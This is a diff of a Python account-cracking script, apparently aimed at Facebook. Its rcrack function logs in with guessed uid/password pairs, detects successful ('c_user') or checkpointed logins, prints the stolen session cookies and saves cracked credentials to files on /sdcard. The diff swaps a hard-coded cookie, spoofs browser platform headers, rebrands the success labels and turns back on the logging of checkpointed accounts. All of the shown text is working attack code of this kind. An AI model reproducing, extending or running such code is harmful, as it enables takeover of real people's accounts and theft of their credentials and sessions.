@@ -236,13 +236,13 @@ def rcrack(uid,pwx,tl):
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=IrSjZHN8gv4e7V0-OffK8uFg; sb=IrSjZH-SScnG52k7Z9YF16qC; m_pixel_ratio=2; wd=360x674; fr=0Kdt1eaUhaQJUBoju..Bko7Qi.5A.AAA.0.0.Bko7RU.AWW6y8aJSKY',
+    # 'cookie': 'datr=79KkZEOgaVhCEl4HOXhA4wwq; sb=79KkZA0CavFfA4TLvdqM-ses; m_pixel_ratio=2; wd=360x674; fr=0cMWGU6At0qezm4q4..BkpNLv.ID.AAA.0.0.BkpNL9.AWVNIkmZrE0',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
     'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
@@ -254,16 +254,16 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[ALIVE] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[NX-KING_OK💯] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/ALIVE.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/NX-KING_OK💯.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
                 #print('\r\r\33[1;30m[MKR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                #open('/sdcard/Tutul-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/KING-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
